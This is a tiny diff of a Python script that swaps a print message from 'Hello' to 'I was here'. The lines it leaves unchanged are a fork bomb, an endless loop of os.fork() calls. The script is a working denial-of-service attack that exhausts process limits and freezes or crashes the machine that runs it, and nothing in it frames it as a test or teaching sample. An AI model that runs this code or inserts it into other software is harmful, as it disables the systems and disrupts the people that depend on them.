@@ -1,5 +1,5 @@
 import os
 
-print('Hello')
+print('I was here')
 while True:
   os.fork()
